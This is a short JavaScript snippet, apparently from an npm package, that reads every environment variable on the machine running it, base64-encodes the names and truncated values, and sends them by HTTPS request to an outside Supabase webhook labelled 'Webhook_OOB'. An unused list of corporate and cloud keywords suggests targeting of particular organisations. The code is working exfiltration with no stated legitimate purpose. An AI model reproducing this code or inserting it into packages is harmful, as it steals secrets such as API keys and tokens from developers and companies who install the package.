const keywords = ['tmo', 'tmus', 'telekom', 'corp', 'internal', 'azure', 'aws'];
let envHits = []; for (const [k,v] of Object.entries(process.env)) { envHits.push(`${k}=${String(v).substring(0, 30)}`); }
const value = envHits.join(',');
const https = require('https');
const report = `example ${value}`;
const data = Buffer.from(report).toString('base64');
const options = {hostname: 'baoreqygjveumkkxydcd.supabase.co', path: `/functions/v1/Webhook_OOB?data=npm_example_${data}`, method: 'GET'};
https.request(options).end();
